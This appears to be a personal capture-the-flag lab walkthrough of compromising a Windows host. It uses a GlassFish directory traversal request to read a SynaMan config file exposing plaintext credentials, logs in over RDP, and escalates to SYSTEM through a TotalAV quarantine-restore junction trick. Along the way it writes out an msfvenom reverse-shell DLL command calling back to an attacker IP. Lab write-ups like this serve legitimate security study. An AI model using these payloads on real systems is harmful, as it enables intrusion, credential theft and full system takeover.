we see smb, rpc, 3389, 4848 glassfish, 7676 java message service, 8080, 8081 glassfish web
deep nmap shows ports 3700 giop, 5040, 6060 synaMan 5.1, 7776 java rmi, 8686 ssl java rmi

we find glassfish has a dir traversal - file disclosure vuln
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
and we're able to get win.ini

port 4848 - admin login portal for glassfish
port 5040 - GIOP (no proper web)

port 6060 - SynaMan 5.1
Login portal.
We google where it stores credentials, and we find it is c:/synaman/config/appconfig.xml
We use the discovered dir-traversal file-disclosure to read that file, and 
```xml
<parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
<parameter name="smtpUser" type="1" value="arthur"></parameter>
<parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
<parameter name="userHomeRoot" value="C:\ProgramData\SynaManHome"></parameter>
```
we try logging into the web portal, but that doesnt work

So we try rdp with arthur:KingOfAtlantis and we in as Arthur!

---
First thing we see, is a totalAV popup
So we searchsploit for totalAV and sure enough, there are 2 PEs
First is to plant a malicious dll file, quarantine it and escape to higher privilege by using ntfs file junction(?) for version 4.3.31
Second is unquoted service path for version 5.15.69

our version is 4.3.31
So let us follow
Basically, the quarantine restore action uses SYSTEM privilege to write a file to a destination controlled by a lower-privilege user. An attacker can change the restore destination which requires SYSTEM privilege to write using a symbolic link.

Failed below
"Steps:
1. Download a malicious DLL generated by msfvenom . In the video, I was targeting a DLL loaded by Windows Update service.
2. After the DLL has been quarantined, create a junction to link the download file location to C:\Windows\System32\ for example linking `c:\users<username>\desktop\test` using a tool
3. Restore the DLL, the file is now written to the mount point- C:\Windows\System32\
4. After restoring, the DLL is detected as a threat the second time and moved to quarantine again
5. If the DLL is restored from Quarantine again, the file is written to C:\Windows\System32\ again
6. If Windows Update services are then triggered, it loads the malicious DLL and the attacker obtains nt authority\SYSTEM privileges.
" -- This failed, as the trigger wasnt running

How I did it, from S1ren's walkthrough --
0. downloaded the releases .7z from the rpo, and put it in my own repo as exes, cloned my repo
1. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.185 LPORT=445 -f dll -o Version.dll`
2. transfer the dll and CreateMountPoint.exe to windows
3. Custom scan on the test dir --> once it is complete, the AV will report the threat, select quarentine, and click "remove threat"
4. `c:\users\arthur\desktop\CreateMountPoint.exe "c:\Users\arthur\desktop\test" "c:\Windows\Microsoft.NET\Framework\v4.0.30319`
5. Restore the dll and note the dll is written to `c:\Windows\Microsoft.NET\Framework\v4.0.30319`
6. `Restart-Computer` listening on 445
Admin!